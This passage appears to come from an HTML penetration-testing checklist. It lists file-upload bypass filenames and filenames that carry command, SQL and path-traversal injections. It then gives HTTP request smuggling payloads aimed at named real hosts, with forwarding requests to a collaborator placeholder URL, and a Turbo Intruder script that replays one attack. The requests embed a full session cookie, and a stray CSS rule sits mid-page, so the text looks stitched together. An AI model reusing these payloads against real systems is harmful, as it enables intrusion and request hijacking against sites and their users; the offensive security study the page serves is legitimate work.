                    <p>file.php%00.jpg</p>
                    <p>file.php\x00.jpg (use hex editor to change bytes)</p>
                    <p>file.php%00</p>
                    <p>file.php%20</p>
                    <p>file.php%0d%0a.jpg</p>
                    <p>file.php.....</p>
                    <p>file.php/</p>
                    <p>file.php.\</p>
                    <p>file.php#.png</p>
                    <p>file.</p>
                    <p>.html</p>
                </div>

                <h4><input type="checkbox" id="content-ish-bypass"> Content-ish Bypass</h4>
                <div class="steps">
                    <p><strong>Content-type validation:</strong></p>
                    <p>Upload file.php and change Content-type to image/png, image/gif, or image/jpg.</p>
                    <p><strong>Content-Length validation:</strong></p>
                    <p>Use small PHP shell code.</p>
                    <p><strong>Content Bypass Shell:</strong></p>
                    <p>Add "GIF89a;" before shell-code in GIF files.</p>
                </div>

                <h4><input type="checkbox" id="magic-numbers-bypass"> Magic Numbers Bypass</h4>
                <div class="steps">
                    <p>Identify file types based on their signature bytes.</p>
                    <p>Use hex editor to modify the magic numbers.</p>
                </div>

                <h4><input type="checkbox" id="vulnerabilities"> Vulnerabilities</h4>
                <div class="steps">
                    <p><strong>Directory Traversal:</strong></p>
                    <p>Set filename to ../../etc/passwd/logo.png</p>
                    <p><strong>SQL Injection:</strong></p>
                    <p>Set filename to 'sleep(10).jpg'</p>
                    <p><strong>Command Injection:</strong></p>
                    <p>Set filename to ; sleep 10;</p>
                    <p><strong>SSRF:</strong></p>
                    <p>Abuse "Upload from URL" with SSRF.</p>
                    <p><strong>XXE:</strong></p>
                    <p>Upload using .svg file with XXE payload.</p>
                    <p><strong>XSS:</strong></p>
                    <p>Upload files with XSS payloads.</p>
                    <p><strong>Open Redirect:</strong></p>
                    <p>Upload using .svg file with redirect payload.</p>
                </div>
pre {
            background: #eee;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
        }
                <h4><input type="checkbox" id="upload-tricks"> Upload Tricks</h4>
                <div class="steps">
                    <p>Use double extensions: .jpg.php, .png.php5</p>
                    <p>Use reverse double extension: .php.jpg</p>
                    <p>Random uppercase and lowercase: .pHp, .pHP5, .PhAr</p>
                    <p>Null byte: .php%00.gif</p>
                    <p>Special characters: Multiple dots, whitespace, new line, RTLO, slash, multiple special characters.</p>
                </div>

                <h4><input type="checkbox" id="references"> References</h4>
                <div class="references">
                    <p><a href="https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md" target="_blank">File Upload Checklist</a></p>
                    <p><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" target="_blank">HackTricks File Upload</a></p>
                    <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" target="_blank">PayloadsAllTheThings</a></p>
                </div>
            </div>
        </div>
        
        
        <!-- Http Request Smuggling -->
        <div class="category">
            <h3><input type="checkbox" id="file-upload">9 > Http Request Smuggling</h3>
            <div class="subcategory">
                <h4><input type="checkbox" id="upload-function"> Sample HTTP Request:</h4>
                <div class="steps">
                  <pre>
POST /login HTTP/1.1
Host: staging-login.newrelic.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/70.0.3508.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cookie: optimizelyEndUserId=oeu1547215128308r0.023321653201122228; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22a5f7b9bb-8c8a-4add-ac69-75200d4c46cb%22; TSNGUID=6093d809-7d9d-4d52-bfb9-335de9fb69b8; _ga=GA1.2.1374597116.1547216490; _gid=GA1.2.1093027572.1547216490; _gcl_au=1.1.1026642629.1547216493; _mkto_trk=id:412-MZS-894&token:_mch-newrelic.com-1547216493639-15775; __qca=P0-235566894-1547221374728; intercom-id-cyym0u3i=bd3a0989-6e9f-4e6d-a497-9a41ef6d5290; _fbp=fb.1.1547249472663.621468648; ei_client_id=5c39274682f6eb000fa6d52a; _golden_gate_session=bkRPMUZ3STBrY0laZG0zemY1Umg5cFVhcWpNaGpvZWN2T0tOM3hWL2p2UVdaVTJLZFh5NkJtQnZHV2FIR3hnZWpKaWFvM2F2WkRab3hjWTd5b3A1T2dOY20zWWNQaFhZNWVRZXFuRkFwU3l1YVZMdm1JSW9pSGd0UnRicnRBUVdhaGg3UXJQTFJ0c3ZkMHRyaHZqNjYreCt4dWUwVlp1UTdrSVFpSEx6akVITjRWWGNrSUR5NGdIdG80UnFJS2xpVTNlU1BpK0hjWEZJMVF1R2I4RlNNeUdicVdTWFVDQnBlQ0NQSXdNYXFJM2lDTWc5VldLOTJ3N1A3Wll5RytpZVNya2J1WTdTNUZ5UVFRNk5KVmt2TmNudlU3WDFQMVJPbGtkWXJJWXd1YjA9LS1MeU1EbTkrZ29qVVo2VkNUMDhnMVp3PT0%3D--155cef8a5f5d2bcb69b1d1952af040a3479aeacb; _gat=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 189
Transfer-Encoding: chunked
Transfer-Encoding: foo

3e
return_to=https%3A%2F%2Fstaging-insights-embed.newrelic.com%2F
0

GET / HTTP/1.1
Host: staging-login.newrelic.com:123
X-Forwarded-Host: skeletonscribe.net
Content-Length: 10

x=

DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7

0

GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
X: X

GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET https://**YOUR_COLLAB_URL**/ HTTP/1.1
X: X
            </pre>

            <h3><input type="checkbox"> Turbo Intruder Code:</h3>
            <pre>
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://staging-login.newrelic.com:443',
                           concurrentConnections=5,
                           requestsPerConnection=5,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )

    attack = '''POST /login HTTP/1.1
Host: staging-login.newrelic.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/70.0.3508.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cookie: optimizelyEndUserId=oeu1547215128308r0.023321653201122228; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22a5f7b9bb-8c8a-4add-ac69-75200d4c46cb%22; TSNGUID=6093d809-7d9d-4d52-bfb9-335de9fb69b8; _ga=GA1.2.1374597116.1547216490; _gid=GA1.2.1093027572.1547216490; _gcl_au=1.1.1026642629.1547216493; _mkto_trk=id:412-MZS-894&token:_mch-newrelic.com-1547216493639-15775; __qca=P0-235566894-1547221374728; intercom-id-cyym0u3i=bd3a0989-6e9f-4e6d-a497-9a41ef6d5290; _fbp=fb.1.1547249472663.621468648; ei_client_id=5c39274682f6eb000fa6d52a; _golden_gate_session=bkRPMUZ3STBrY0laZG0zemY1Umg5cFVhcWpNaGpvZWN2T0tOM3hWL2p2UVdaVTJLZFh5NkJtQnZHV2FIR3hnZWpKaWFvM2F2WkRab3hjWTd5b3A1T2dOY20zWWNQaFhZNWVRZXFuRkFwU3l1YVZMdm1JSW9pSGd0UnRicnRBUVdhaGg3UXJQTFJ0c3ZkMHRyaHZqNjYreCt4dWUwVlp1UTdrSVFpSEx6akVITjRWWGNrSUR5NGdIdG80UnFJS2xpVTNlU1BpK0hjWEZJMVF1R2I4RlNNeUdicVdTWFVDQnBlQ0NQSXdNYXFJM2lDTWc5VldLOTJ3N1A3Wll5RytpZVNya2J1WTdTNUZ5UVFRNk5KVmt2TmNudlU3WDFQMVJPbGtkWXJJWXd1YjA9LS1MeU1EbTkrZ29qVVo2VkNUMDhnMVp3PT0%3D--155cef8a5f5d2bcb69b1d1952af040a3479aeacb; _gat=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 189
Transfer-Encoding: chunked
Transfer-Encoding: foo

3e
return_to=https%3A%2F%2Fstaging-insights-embed.newrelic.com%2F
0

GET / HTTP/1.1
Host: staging-login.newrelic.com:123
X-Forwarded-Host: skeletonscribe.net
Content-Length: 10

x='''
    engine.queue(attack)
    engine.start()
            </pre>

            <h3><input type="checkbox" id="references"> References:</h3>
            <ul>
                <li><a href="https://hackerone.com/reports/726773">HackerOne Report 726773</a></li>
                <li><a href="https://hackerone.com/reports/498052">HackerOne Report 498052</a></li>
                <li><a href="https://hackerone.com/reports/771666">HackerOne Report 771666</a></li>
            </ul>
        </div>
    </div>
        
    </main>
</body>
</html>
